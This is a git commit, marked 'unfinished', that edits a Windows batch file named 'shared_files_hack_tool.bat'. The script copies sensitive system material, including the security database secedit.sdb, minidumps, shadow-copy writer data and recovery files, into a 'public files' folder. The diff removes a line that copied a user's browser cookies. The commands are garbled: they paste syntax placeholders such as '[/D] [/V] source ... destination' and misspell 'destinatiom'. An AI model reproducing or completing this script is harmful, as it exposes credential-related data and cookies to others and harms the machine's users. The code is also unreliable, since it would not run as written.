c094a8fb07cecff1c39ee7a57f5541f8700c33f1
coldflamethefirst <coldflamethefirst@gmail.com>
2014-02-19 23:09:41 +0000

    unfinished

--- shared_files_hack_tool.bat
+++ shared_files_hack_tool.bat
@@ -1,7 +1,7 @@
 cd C:\Users
 mkdir "public files"
 cd C:\
-copy [/D] [/V] source C:\Windows\security destination C:\Users\public files
+copy [/D] [/V] source C:\Windows\security\database\secedit.sdb destination C:\Users\public files\secedit.sdb
 copy C:\Windows\Minidump C:\Users\public files
 copy C:\Windows\Vss\Writers\System C:\Users\public files
 copy C:\Windows\Temp C:\Users\public files
@@ -10,4 +10,3 @@ copy C:\Windows\System32\catroot C:\Users\public files
 copy C:\Windows\System32\catroot2 C:\Users\public files
 copy C:\Windows\System32\Recovery C:\Users\public files
 copy C:\Windows\rescache C:\Users\public files
-copy source C:\Users\struan\AppData\Roaming\Microsoft\Windows\Cookies\*.txt destinatiom C:\Users\public files
